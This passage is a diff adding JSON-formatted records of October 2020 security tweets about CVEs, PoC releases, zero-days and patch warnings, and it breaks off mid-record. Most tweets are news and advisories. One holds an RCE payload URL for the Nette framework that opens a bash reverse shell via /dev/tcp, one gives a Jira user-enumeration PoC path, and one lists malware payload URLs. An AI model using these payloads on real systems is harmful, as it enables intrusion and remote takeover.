@@ -3699,3 +3699,2289 @@
     "tweeturl": "https://twitter.com/steventseeley/status/1311756852871471111",
     "username": "steventseeley"
 }
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-discloses-windows-zero-day-exploited-in-the-wild/"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 13,
+    "tweetreplies": 6,
+    "tweetretweets": 101,
+    "tweettext": "NEW: Google discloses Windows zero-day exploited in the wild\n\n-Impacts Windows 7 up to the latest Windows 10\n-Used together with a Chrome zero-day (patched last week)\n\nWindows zero-day CVE: CVE-2020-17087\nChrome zero-day CVE: CVE-2020-15999 \n\nhttps://t.co/hddB1UvqXc https://t.co/y3R9sPU7z7",
+    "tweettime": "2020-10-30, 18:31:39",
+    "tweeturl": "https://twitter.com/campuscodi/status/1322244795155288064",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 182,
+    "tweettext": "RT @benhawkes: In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel…",
+    "tweettime": "2020-10-30, 16:52:25",
+    "tweeturl": "https://twitter.com/AdmVonSchneider/status/1322219820423798786",
+    "username": "AdmVonSchneider"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2104"
+    ],
+    "tweetfavorites": 339,
+    "tweetquotes": 26,
+    "tweetreplies": 3,
+    "tweetretweets": 164,
+    "tweettext": "In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel bug (CVE-2020-17087) that was used for a sandbox escape. The technical details of CVE-2020-17087 are now available here: https://t.co/bO451188Mk",
+    "tweettime": "2020-10-30, 16:00:47",
+    "tweeturl": "https://twitter.com/benhawkes/status/1322206828202127360",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf"
+    ],
+    "tweetfavorites": 621,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 246,
+    "tweettext": "Analysis of CVE-2020-14882\nWeblogic RCE via HTTP CVSS 9.8/10\nHope you enjoy it ;)\nThanks an anonymous man for supporting!\nhttps://t.co/Olhn9oye0r",
+    "tweettime": "2020-10-28, 09:57:29",
+    "tweeturl": "https://twitter.com/testanull/status/1321390624042442753",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://github.com/rogue-kdc/CVE-2020-16939"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "GitHub - rogue-kdc/CVE-2020-16939: PoC code for CVE-2020-16939 Windows Group Policy DACL Overwrite Privilege Escalation - https://t.co/JCs5qb6d7L",
+    "tweettime": "2020-10-27, 18:37:09",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1321159014252597249",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf"
+    ],
+    "tweetfavorites": 123,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 45,
+    "tweettext": "In this post I'll go through the exploit of CVE-2020-6449, a use-after-free in blink that I found in March, and break PartitionAlloc in the process: https://t.co/MG7HRkGZpk",
+    "tweettime": "2020-10-27, 17:04:33",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1321135708858470402",
+    "username": "mmolgtm"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/3jzOoka"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "Using the Windows Group Policy client to escalate privileges. @rogue_kdc provides a guest blog and PoC showing how CVE-2020-16939 can be abused by attackers to obtain full permissions on the contents of a folder. https://t.co/0PyMPWkM8y",
+    "tweettime": "2020-10-27, 16:14:32",
+    "tweeturl": "https://twitter.com/thezdi/status/1321123122226040832",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/",
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/"
+    ],
+    "tweetfavorites": 296,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 147,
+    "tweettext": "Just published advisories for Pulse Connect Secure CVE-2020-8260 and CVE-2020-8255. Auth file read and auth RCE.\n\nDocumenting some new RCE techniques for arbitrary file write on PCS with \n@johnnyspandex\n\nhttps://t.co/t5SUU8EACV\n\nhttps://t.co/KxO8mWYLhR",
+    "tweettime": "2020-10-26, 20:06:11",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1320819032128425984",
+    "username": "buffaloverflow"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Active DDoS malware payload detected:\nhttp://172.245.7.141/b\nhttp://172.245.7.141/c\nhttp://172.245.7.141/w\n\nTarget:\nTenda AC1200 router RCE (CVE-2019-5071)\nTenda AC1900 router RCE (CVE-2020-10987)\nWiFiDog RCE\n\nExploit attempt source IP: 172.245.7.141 (🇺🇸)\n#threatintel https://t.co/NFQxJamSzE",
+    "tweettime": "2020-10-25, 00:23:03",
+    "tweeturl": "https://twitter.com/bad_packets/status/1320158900251865089",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-17023"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "⚠️VS Codeで、悪意のある「package.json」ファイルを開くと、リモートコード実行される脆弱性が報告されています。対処方法として最新版1.50.1に更新しておきましょう‼️\n🌐CVE-2020-17023 Visual Studio JSON Remote Code Execution Vulnerability\nhttps://t.co/QPYQzDqKm7\n#VSCodejp #VSCode快適生活 https://t.co/70XRMOSxkj",
+    "tweettime": "2020-10-23, 10:33:20",
+    "tweeturl": "https://twitter.com/ayatokura/status/1319587705462747137",
+    "username": "ayatokura"
+}
+{
+    "expanded_url": [
+        "https://www.oracle.com/security-alerts/cpuoct2020.html"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 91,
+    "tweettext": "[Vulnerability warning] CVE-2020-14882 + CVE-2020-14883 = one Get request RCE!  Please update immediately! https://t.co/rej5WheNUY https://t.co/Jy1cAwfj0r",
+    "tweettime": "2020-10-22, 05:07:58",
+    "tweeturl": "https://twitter.com/80vul/status/1319143436159647744",
+    "username": "80vul"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "🚨ICYMI: Chrome patched a zero-day today (CVE-2020-15999) that's being actively exploited in the wild. Update now.🚨\n\nNote Firefox uses the same vulnerable library (freetype). I can't find any info on whether Firefox is vulnerable or if they've pushed any kind of fix...",
+    "tweettime": "2020-10-21, 20:46:57",
+    "tweeturl": "https://twitter.com/KentonVarda/status/1319017350180503557",
+    "username": "KentonVarda"
+}
+{
+    "expanded_url": [
+        "https://jira.atlassian.com/browse/JRASERVER-71560"
+    ],
+    "tweetfavorites": 412,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 172,
+    "tweettext": "Atlassian Jira unauthenticated user enumeration (CVE-2020-14181)! Versions affected:\n\nJira &lt; 7.13.6\n8.0.0 ≤ Jira &lt; 8.5.7\n8.6.0 ≤ Jira &lt; 8.12.0\n\nDiscovered by Mikhail Klyuchnikov.\n\nAdvisory: https://t.co/Pm5Vp1JvzV\n\n/secure/ViewUserHover.jspa?username=test\nThe PoC ☝️ https://t.co/jfHgSzpFAB",
+    "tweettime": "2020-10-21, 13:59:20",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318914772918767619",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 33,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 22,
+    "tweettext": "Die am 13.10. von Microsoft bereitgestellten #Sicherheitsupdates zur Behebung der kritischen #RCE #Schwachstelle CVE-2020-16952 in #SharePoint 2013-2019 wurden bislang auf fast keinem System in Deutschland eingespielt.\nPoC #Exploit-Code ist öffentlich verfügbar! #PATCHNOW! https://t.co/v6IeX7zLya",
+    "tweettime": "2020-10-21, 10:02:29",
+    "tweeturl": "https://twitter.com/certbund/status/1318855168042074117",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://github.com/GoSecure/WSuspicious/",
+        "https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Our CVE-2020-1013 #LPE #PoC is out: WSuspicious\nAvailable here: https://t.co/d3aZgLKi4v\nBlog post reminder: https://t.co/wztiqQ7bj8\nResearch on #WSUS is still ongoing btw 🤫",
+    "tweettime": "2020-10-20, 20:43:07",
+    "tweeturl": "https://twitter.com/GoSecure_Inc/status/1318653999600500746",
+    "username": "GoSecure_Inc"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-releases-chrome-security-update-to-patch-actively-exploited-zero-day/"
+    ],
+    "tweetfavorites": 153,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 102,
+    "tweettext": "BREAKING: Google releases Chrome security update to patch actively exploited zero-day\n\n-Google Chrome 86.0.4240.111 released with a fix\n-0day is CVE-2020-15999 (a heap buffer overflow in the FreeType font rendering library)\n\nhttps://t.co/K73F1MV64T https://t.co/f1mCDUytbC",
+    "tweettime": "2020-10-20, 20:29:17",
+    "tweeturl": "https://twitter.com/campuscodi/status/1318650517124427777",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html"
+    ],
+    "tweetfavorites": 540,
+    "tweetquotes": 42,
+    "tweetreplies": 9,
+    "tweetretweets": 206,
+    "tweettext": "Project Zero discovered and reported an actively exploited 0day in freetype that was being used to target Chrome. A stable release that fixes this issue (CVE-2020-15999) is available here: https://t.co/ZRQe72Qfkh",
+    "tweettime": "2020-10-20, 19:49:10",
+    "tweeturl": "https://twitter.com/benhawkes/status/1318640422571266048",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 363,
+    "tweettext": "RT @Adam_pi3: CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t…",
+    "tweettime": "2020-10-20, 15:53:43",
+    "tweeturl": "https://twitter.com/binitamshah/status/1318581168313311232",
+    "username": "binitamshah"
+}
+{
+    "tweetfavorites": 41,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 12,
+    "tweettext": "CVE-2020-13957 is a pretty handy bug. Easy RCE on Solr  6/7/8x versions, pre-auth often. If the Solr version is old enough, you can even chain it with CVE-2017-3164 to exploit non-exposed instances too! \n\nNever expose your Solr API/Admin interface, even internally. It's BAD idea!",
+    "tweettime": "2020-10-20, 14:54:36",
+    "tweeturl": "https://twitter.com/hkashfi/status/1318566290647322624",
+    "username": "hkashfi"
+}
+{
+    "expanded_url": [
+        "https://medium.com/@testbnull/cve-2020-4280-ibm-qradar-java-deserialization-anlysis-and-bypass-c3fe57207057"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 15,
+    "tweettext": "A few words about the CVE-2020-4280 - IBM QRadar Java Deserialization and the patch of it\n\nhttps://t.co/oZ39hxEfr0",
+    "tweettime": "2020-10-20, 12:50:34",
+    "tweeturl": "https://twitter.com/testanull/status/1318535076926222341",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://help.rapid7.com/nexpose/en-us/release-notes/index.html?pid=6.6.49"
+    ],
+    "tweetfavorites": 183,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 78,
+    "tweettext": "Rapid7 Nexpose &lt;= 6.6.48 boolean-based #SQLi found by Mikhail Klyuchnikov.\n\n\"This vulnerability could have allowed an authenticated user with a low permission level to access resources beyond their assigned permissions.\" - Rapid7\n\nCVE-2020-7383\n\n👉https://t.co/UxdfjTvsg7 https://t.co/6SuTP77cic",
+    "tweettime": "2020-10-19, 12:02:34",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318160610450984961",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 488,
+    "tweetquotes": 9,
+    "tweetreplies": 1,
+    "tweetretweets": 249,
+    "tweettext": "Hacker publishes a detailed explanation of the exploitation of Windows TCP/IP remote code execution (CVE-2020-16898) vulnerability.\n\nhttps://t.co/P3HuTggpYY",
+    "tweettime": "2020-10-17, 06:48:33",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1317356809787592705",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 733,
+    "tweetquotes": 9,
+    "tweetreplies": 10,
+    "tweetretweets": 363,
+    "tweettext": "CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t.co/MhKxEvLig4",
+    "tweettime": "2020-10-16, 19:00:49",
+    "tweeturl": "https://twitter.com/Adam_pi3/status/1317178701457575936",
+    "username": "Adam_pi3"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/d4em0n/e8d209e786f63493339f2ddef4d44e3d"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 72,
+    "tweettext": "Exploit CVE-2020-8835 (another kernel bpf bug). Same approach i did exploiting CVE-2017-16995 in the previous tweet. Overwriting bpf_map ops from array_of_map to array_of_maps_map_ops to gain arbitrary write, then overwriting modprobe_path to get root\nhttps://t.co/2fn5H0NKk3 https://t.co/m1OJPxUElp",
+    "tweettime": "2020-10-16, 14:35:20",
+    "tweeturl": "https://twitter.com/n0psledbyte/status/1317111893408968704",
+    "username": "n0psledbyte"
+}
+{
+    "expanded_url": [
+        "https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
+    "tweettext": "[BLOG] Beware the Bad Neighbor: Analysis and PoC of the Windows IPv6 Router Advertisement Vulnerability (CVE-2020-16898) https://t.co/YQqarGG6Hy by @fdfalcon",
+    "tweettime": "2020-10-16, 09:26:45",
+    "tweeturl": "https://twitter.com/quarkslab/status/1317034233236520960",
+    "username": "quarkslab"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 82,
+    "tweettext": "CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility)\n\nhttps://t.co/0ck5mrbwaO https://t.co/AOvsBKdGVF",
+    "tweettime": "2020-10-16, 08:21:35",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1317017834791329792",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 29,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 31,
+    "tweettext": "Am 13.10. hat Microsoft Sicherheitsupdates für kritische #RCE #Schwachstellen (CVE-2020-16951, -16952) in #SharePoint 2013-2019 veröffentlicht.\n#PoC #Exploit Code ist bereits öffentlich verfügbar.\nAktuell sind mindestens 600 SharePoint-Server in Deutschland verwundbar. #PATCHNOW! https://t.co/9tTuXR0SoY",
+    "tweettime": "2020-10-16, 05:30:02",
+    "tweeturl": "https://twitter.com/certbund/status/1316974664120492033",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "GitHub - 0neb1n/CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility) - https://t.co/lxlEQcBBTn",
+    "tweettime": "2020-10-16, 00:55:44",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1316905632587501569",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 505,
+    "tweetquotes": 7,
+    "tweetreplies": 5,
+    "tweetretweets": 232,
+    "tweettext": "Please make sure to patch your Windows systems. CVE-2020-16938 is no joke. Hard Drive encryption does break this attack, however, most servers and virtual machines don't have HDD encryption enabled. Patch! #ntdsdit op: @jonasLyk https://t.co/PmEfMIRMKg",
+    "tweettime": "2020-10-15, 20:28:48",
+    "tweeturl": "https://twitter.com/mubix/status/1316838457881300992",
+    "username": "mubix"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 366,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 156,
+    "tweettext": "https://t.co/KnBoYPhfcY\nwriteup and poc of cve-2020-16947 (outlook rce vuln)",
+    "tweettime": "2020-10-15, 14:59:53",
+    "tweeturl": "https://twitter.com/0neb1n/status/1316755683065307136",
+    "username": "0neb1n"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "PoC published for CVE-2020-16952, a post-auth Microsoft SharePoint RCE\n\nhttps://t.co/3P4UaMqt36 https://t.co/v6LUl0I5rx",
+    "tweettime": "2020-10-15, 10:33:49",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316688725800374279",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/14265"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
+    "tweettext": "SharePoint admins: PATCH !\nUpcoming Microsoft SharePoint Server-Side Include and ViewState RCE (CVE-2020-16952) exploit in #metasploit\n\n@msftsecurity you can update your advisory\n\nVulnerability found by @steventseeley and module by @wvuuuuuuuuuuuuu \n\nhttps://t.co/MOsRPDSHu6 https://t.co/EOKPqeUfBT",
+    "tweettime": "2020-10-15, 08:47:19",
+    "tweeturl": "https://twitter.com/ddouhine/status/1316661921974833152",
+    "username": "ddouhine"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 56,
+    "tweettext": "@BleepinComputer Barnes &amp; Noble had multiple Pulse Secure VPN servers that went unpatched against CVE-2019-11510 for months. Data from their servers was found in the recent leak (https://t.co/4NtBO5Xps8) as well.",
+    "tweettime": "2020-10-15, 05:01:36",
+    "tweeturl": "https://twitter.com/bad_packets/status/1316605119564193799",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16922"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 52,
+    "tweettext": "The #CVE-2020-16922 is a #spoofing #vulnerability we submitted to #Microsoft. When a malicious #JAR or #HTA appended to a #CAT file properly #signed by #Microsoft, the security features to prevent improperly signed files from loading gets bypassed.\n\nhttps://t.co/HSSKidjjjX https://t.co/IxH8YH3ayS",
+    "tweettime": "2020-10-15, 04:12:57",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1316592876881502208",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://github.com/corelight/CVE-2020-16898"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "Just released a simple Zeek package that nicely detects CVE-2020-16898 AKA \"Bad Neighbor” (Windows TCP/IP Remote Code Execution vuln) https://t.co/QZiuvhPH5k @corelight_inc @ynadji",
+    "tweettime": "2020-10-14, 23:55:14",
+    "tweeturl": "https://twitter.com/benreardon/status/1316528019062710272",
+    "username": "benreardon"
+}
+{
+    "tweetfavorites": 293,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "Looking at patch diff of tcpip.sys, it seems \"Ipv6pHandleRouterAdvertisement()\" function which is called by \"Icmpv6ReceiveDatagrams()\" function is guilty for Microsoft Windows ICMPv6 router advertisement RCE vulnerability (CVE-2020-16898): https://t.co/9HLISvpHil",
+    "tweettime": "2020-10-14, 21:52:19",
+    "tweeturl": "https://twitter.com/hosselot/status/1316497085320097792",
+    "username": "hosselot"
+}
+{
+    "tweetfavorites": 71,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 13,
+    "tweettext": "Figured out CVE-2020-16898 finally. Definitely a biiiiig caveat to exploitation that nobody is talking about (and I won't mention it at the moment, sorry) https://t.co/7zwdrL1vml",
+    "tweettime": "2020-10-14, 19:29:29",
+    "tweeturl": "https://twitter.com/thracky/status/1316461143754510337",
+    "username": "thracky"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16947"
+    ],
+    "tweetfavorites": 45,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Microsoft is on fire lately 🔥 \n\nCVE-2020-16947 | Microsoft Outlook Remote Code Execution Vulnerability\n\nhttps://t.co/4I5ZnrNToP",
+    "tweettime": "2020-10-14, 18:20:28",
+    "tweeturl": "https://twitter.com/0xdea/status/1316443774743121920",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/zn2BQZr"
+    ],
+    "tweetfavorites": 260,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 119,
+    "tweettext": "CVE-2020-15227 PHP framework nette callback RCE\n\nPOC: /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1\n\nhttps://t.co/M4oEFOYZva https://t.co/TH5Iu9lFDP",
+    "tweettime": "2020-10-14, 16:30:52",
+    "tweeturl": "https://twitter.com/chybeta/status/1316416189527068672",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.youtube.com/watch?v=TjTAYarKDJQ"
+    ],
+    "tweetfavorites": 49,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Researchers at Theori have successfully confirmed the CVE-2020-16898 vulnerability, dubbed as Bad Neighbor, by demonstrating a remote crash of Windows with BSOD. Be aware of those packets! We are working to craft an RCE exploit, though it looks tough ;)\n\nhttps://t.co/AfRYs0g4iD",
+    "tweettime": "2020-10-14, 14:50:15",
+    "tweeturl": "https://twitter.com/theori_io/status/1316390869537153025",
+    "username": "theori_io"
+}
+{
+    "expanded_url": [
+        "https://tiger-team-1337.blogspot.com/2020/10/audi-a7-2014-mmi-mishandles-format.html"
+    ],
+    "tweetfavorites": 678,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 254,
+    "tweettext": "There was CVE-2020-16142 for Benz and CVE-2017-9212 for BMW. Now I present you, Audi. Because why not 😂 https://t.co/JnkGeTgw9x https://t.co/aQQx6hhh1h",
+    "tweettime": "2020-10-14, 14:09:21",
+    "tweeturl": "https://twitter.com/Kevin2600/status/1316380576593571840",
+    "username": "Kevin2600"
+}
+{
+    "tweetfavorites": 195,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 117,
+    "tweettext": "Threat level: very préoccupé\n\nCVE-2020-16947 - Microsoft Outlook RCE Vulnerability” allows attackers to send specially crafted emails that can execute commands when opened in the Microsoft Outlook software. This attack also works when an email is viewed in the preview pane. https://t.co/P9ldLFkosM",
+    "tweettime": "2020-10-14, 08:05:06",
+    "tweeturl": "https://twitter.com/H_Miser/status/1316288911040274437",
+    "username": "H_Miser"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\nVulnerability Details:\nhttps://t.co/iAX5FiFajJ\nUpdate:\nhttps://t.co/TKrrUk4iQB https://t.co/j33DMv59eV",
+    "tweettime": "2020-10-14, 03:22:26",
+    "tweeturl": "https://twitter.com/blackorbird/status/1316217774125924352",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://h0mbre.github.io/RyzenMaster_CVE/"
+    ],
+    "tweetfavorites": 675,
+    "tweetquotes": 14,
+    "tweetreplies": 15,
+    "tweetretweets": 244,
+    "tweettext": "CVE-2020-12928, Privilege Escalation in AMD Ryzen Master Overclocking Utility Driver AMDRyzenMaster.sys exploit proof-of-concept. Thanks to everyone mentioned for the help! https://t.co/rmIXieOOvC",
+    "tweettime": "2020-10-14, 00:18:23",
+    "tweeturl": "https://twitter.com/h0mbre_/status/1316171459446726656",
+    "username": "h0mbre_"
+}
+{
+    "tweetfavorites": 312,
+    "tweetquotes": 26,
+    "tweetreplies": 8,
+    "tweetretweets": 232,
+    "tweettext": "Update your Microsoft software now so your system isn't exploited: CVE-2020-16898 in particular should be patched or mitigated immediately, as vulnerable systems could be compromised remotely.",
+    "tweettime": "2020-10-13, 22:54:26",
+    "tweeturl": "https://twitter.com/US_CYBERCOM/status/1316150332498608128",
+    "username": "US_CYBERCOM"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/jal83d/cve202016952_microsoft_sharepoint_server/"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 132,
+    "tweettext": "CVE-2020-16898 (Windows TCP/IP RCE) is beaten by CVE-2020-16952 (SharePoint post auth file inclusion leading to RCE). CVE-2020-16952 has an exploit out and when combined with password spraying/phishing for creds s a threat right now - https://t.co/IZbbn8aB4o",
+    "tweettime": "2020-10-13, 20:12:25",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1316109559526838275",
+    "username": "ollieatnccgroup"
+}
+{
+    "tweetfavorites": 1096,
+    "tweetquotes": 40,
+    "tweetreplies": 20,
+    "tweetretweets": 483,
+    "tweettext": "CVE-2020-16938 - aka bits please!\nSo...recent update changed the permissions on partitions and volume device objects, granting everybody read access.\nThis means that by opening the device directly you can read the raw data without any privs.\n7zip parses NTFS so super for POC https://t.co/JXBTmcEIxQ",
+    "tweettime": "2020-10-13, 19:53:47",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316104870987010048",
+    "username": "jonasLyk"
+}
+{
+    "tweetfavorites": 435,
+    "tweetquotes": 6,
+    "tweetreplies": 8,
+    "tweetretweets": 137,
+    "tweettext": "CVE-2020-16938 WRITEUP- aka how I installed an UEFI bootkit from edge sandbox.\nSo- the UEFI partition runs FAT32( No ACL or owner concepts)- so instead access is controlled virtually.\nThing is though- by just requesting MAX for permissions everything is bypassed and you get write https://t.co/qcCZKFU6pg",
+    "tweettime": "2020-10-13, 19:38:35",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316101042279452673",
+    "username": "jonasLyk"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 20,
+    "tweettext": "\"CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\"\n\n\"A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets. \"\n\nhttps://t.co/bC1M9eOu2o",
+    "tweettime": "2020-10-13, 19:20:25",
+    "tweeturl": "https://twitter.com/circl_lu/status/1316096472375603202",
+    "username": "circl_lu"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/",
+        "https://srcincite.io/pocs/cve-2020-16952.py.txt"
+    ],
+    "tweetfavorites": 381,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 209,
+    "tweettext": "Microsoft SharePoint Server DataFormWebPart CreateChildControls Server-Side Include Remote Code Execution Vulnerability\n\nCVE: CVE-2020-16952\nAdvisory: https://t.co/ArJrenuRR5\nTechnical analysis + PoC exploit: https://t.co/sKCiTY1Ver",
+    "tweettime": "2020-10-13, 18:33:20",
+    "tweeturl": "https://twitter.com/steventseeley/status/1316084624553017345",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 415,
